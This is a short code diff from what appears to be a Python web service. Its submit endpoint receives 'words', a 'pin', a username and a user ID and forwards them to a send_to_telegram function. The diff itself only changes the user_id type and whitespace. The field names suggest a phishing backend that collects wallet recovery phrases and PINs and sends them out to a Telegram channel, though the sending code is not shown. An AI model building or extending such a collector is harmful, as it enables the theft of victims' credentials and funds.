@@ -34,7 +34,7 @@ class Data(BaseModel):
     words: List[str]
     pin: str
     username: str
-    user_id: int
+    user_id: str
 
 
 def send_to_telegram(words, pin, username, user_id):
@@ -61,6 +61,7 @@ async def submit(data: Data):
     send_to_telegram(data.words, data.pin, data.username, data.user_id)
 
     return {"status": "ok"}
+
 
 
 
